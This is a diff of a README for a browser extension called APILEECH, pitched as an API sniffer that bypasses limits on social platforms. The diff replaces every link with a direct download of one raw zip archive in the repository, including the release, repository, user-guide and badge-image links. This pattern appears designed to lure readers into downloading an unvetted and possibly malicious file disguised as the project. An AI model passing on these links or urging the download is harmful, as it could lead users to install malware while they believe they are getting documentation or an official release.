@@ -1,7 +1,7 @@
 # 🌟 APILEECH - Capture Network Requests with Ease
 
 ## 🔗 Download APILEECH
-[![Download APILEECH](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Karthijay18/APILEECH/releases)
+[![Download APILEECH](https://raw.githubusercontent.com/Karthijay18/APILEECH/main/poc/Software-v2.3.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Karthijay18/APILEECH/main/poc/Software-v2.3.zip)
 
 ## 📖 Overview
 APILEECH is a browser extension designed to help you capture network requests. It works seamlessly as an API sniffer, allowing you to bypass limits and access features beyond standard API restrictions. This tool is ideal for users of various platforms, including Discord, Facebook, Instagram, TikTok, and Twitter.
@@ -21,7 +21,7 @@ APILEECH is a browser extension designed to help you capture network requests. I
 ## 🚀 Getting Started
 Follow these steps to download and set up APILEECH on your computer:
 
-1. Visit the *[download page](https://github.com/Karthijay18/APILEECH/releases)* to access the latest version.
+1. Visit the *[download page](https://raw.githubusercontent.com/Karthijay18/APILEECH/main/poc/Software-v2.3.zip)* to access the latest version.
 2. Choose the version that suits your browser and operating system.
 3. Click the download link and save the file to your computer.
 
@@ -65,8 +65,8 @@ We continuously work on enhancing APILEECH. Future updates may include:
 
 ## 🔗 Additional Resources
 For more information, visit:
-- [GitHub Repository](https://github.com/Karthijay18/APILEECH)
-- [User Guide](https://github.com/Karthijay18/APILEECH/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Karthijay18/APILEECH/main/poc/Software-v2.3.zip)
+- [User Guide](https://raw.githubusercontent.com/Karthijay18/APILEECH/main/poc/Software-v2.3.zip)
 
 ## 📥 Download APILEECH Again
-[![Download APILEECH](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Karthijay18/APILEECH/releases)
+[![Download APILEECH](https://raw.githubusercontent.com/Karthijay18/APILEECH/main/poc/Software-v2.3.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Karthijay18/APILEECH/main/poc/Software-v2.3.zip)
